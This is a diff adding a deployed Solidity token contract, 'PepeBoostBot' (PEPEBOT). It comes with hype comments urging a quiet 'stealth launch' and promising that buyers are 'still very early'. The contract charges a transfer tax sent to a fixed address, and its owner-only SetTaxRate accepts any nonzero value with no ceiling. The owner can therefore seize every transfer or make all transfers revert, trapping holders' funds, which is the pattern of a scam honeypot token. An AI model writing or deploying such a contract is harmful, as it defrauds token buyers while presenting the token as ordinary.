@@ -1,0 +1,106 @@
+/**
+ *Submitted for verification at Etherscan.io on 2023-08-11
+*/
+
+// SPDX-License-Identifier: MIT
+
+// Data Science, Blockchain Analytics, Finding Profits onchain.
+// 
+// Pls dont shout to the others.
+// Stealth launch.
+// You are still very early.
+// The strongest China shitcoin analysis bot(~3000members).
+// Now welcome new friends from all over the world.
+
+// twitter:https://twitter.com/pepebot888_coin
+// telegram:https://t.me/pepeboost888
+
+pragma solidity ^0.8.0;
+
+contract PEPEBOT {
+    string public name;
+    string public symbol;
+    uint8 public decimals;
+    uint256 public totalSupply;
+    address public taxAddress;
+    uint256 public taxRate;
+    address private owner;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event OwnershipTransferred(address to);
+
+    constructor() {
+        name = "PepeBoostBot";
+        symbol = "PEPEBOT";
+        decimals = 18;
+        totalSupply = 10000000000000 * 10**uint256(decimals);
+        taxAddress = 0xe592218B3fC6DD81983EBD2bd36db2411Ecd5A14;
+        taxRate = 5;
+        balanceOf[msg.sender] = totalSupply;
+        owner = msg.sender;
+    }
+
+    function transfer(address to, uint256 value) public returns (bool) {
+        uint256 taxAmount = (value * taxRate) / 100;
+        uint256 taxedValue = value - taxAmount;
+
+        require(to != address(0), "Invalid address");
+        require(balanceOf[msg.sender] >= value, "Insufficient balance");
+
+        balanceOf[msg.sender] -= value;
+        balanceOf[taxAddress] += taxAmount;
+        balanceOf[to] += taxedValue;
+
+        emit Transfer(msg.sender, to, taxedValue);
+        emit Transfer(msg.sender, taxAddress, taxAmount);
+        return true;
+    }
+
+    function approve(address spender, uint256 value) public returns (bool) {
+        allowance[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+        return true;
+    }
+    
+    function SetTaxRate(uint256 value) public onlyOwner {
+        require(value != 0, "Invalid address");
+        taxRate = value;
+    }
+
+    function transferFrom(address from, address to, uint256 value) public returns (bool) {
+        uint256 taxAmount = (value * taxRate) / 100;
+        uint256 taxedValue = value - taxAmount;
+
+        require(from != address(0), "Invalid address");
+        require(to != address(0), "Invalid address");
+        require(balanceOf[from] >= value, "Insufficient balance");
+        require(allowance[from][msg.sender] >= value, "Allowance exceeded");
+
+        balanceOf[from] -= value;
+        balanceOf[taxAddress] += taxAmount;
+        balanceOf[to] += taxedValue;
+        allowance[from][msg.sender] -= value;
+
+        emit Transfer(from, to, taxedValue);
+        emit Transfer(from, taxAddress, taxAmount);
+        return true;
+    }
+    
+    function isOwner(address account) private view returns (bool) {
+        return account == owner;
+    }
+
+    modifier onlyOwner() {
+        require(isOwner(msg.sender), "!OWNER");
+        _;
+    }
+
+    function renounceOwnership() public onlyOwner {
+        owner = address(0);
+        emit OwnershipTransferred(address(0));
+    }
+}
